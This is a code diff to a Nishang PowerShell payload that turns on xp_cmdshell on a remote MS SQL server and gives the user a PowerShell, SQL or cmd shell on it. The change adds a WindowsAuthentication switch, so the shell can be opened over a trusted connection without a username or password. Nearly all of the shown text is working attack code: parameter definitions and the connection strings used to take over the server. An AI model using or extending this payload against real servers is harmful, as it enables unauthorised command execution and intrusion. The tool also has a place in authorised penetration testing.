@@ -6,7 +6,8 @@ Nishang payload which could be used to execute commands remotely on a MS SQL ser
 .DESCRIPTION
 This payload needs a valid administrator username and password on remote SQL server.
 It uses the credentials to enable xp_cmdshell and provides a powershell shell, a sql shell
-or a cmd shell on the target.
+or a cmd shell on the target. If the WindowsAuthentication switch is used, an attempt is made to 
+use the Windows Authentication. No username and password is required in such case.
 
 .PARAMETER ComputerName
 Enter CopmuterName or IP Address of the target SQL server.
@@ -46,7 +47,11 @@ http://www.truesec.com
     
         [parameter(Mandatory = $true, Position = 2)]
         [string]
-        $Password
+        $Password,
+                
+        [parameter()]
+        [switch]
+        $WindowsAuthentication
     )
   
     Try{
@@ -54,6 +59,10 @@ http://www.truesec.com
     {
         $Connection = New-Object System.Data.SQLClient.SQLConnection
         $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+        if ($WindowsAuthentication -eq $True)
+        {
+            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
+        }
         $Connection.Open()
         $Command = New-Object System.Data.SQLClient.SQLCommand
         $Command.Connection = $Connection
@@ -72,6 +81,10 @@ http://www.truesec.com
     {
         $Connection = New-Object System.Data.SQLClient.SQLConnection
         $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+        if ($WindowsAuthentication -eq $True)
+        {
+            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
+        }
         $Connection.Open()
         $Command = New-Object System.Data.SQLClient.SQLCommand
         $Command.Connection = $Connection
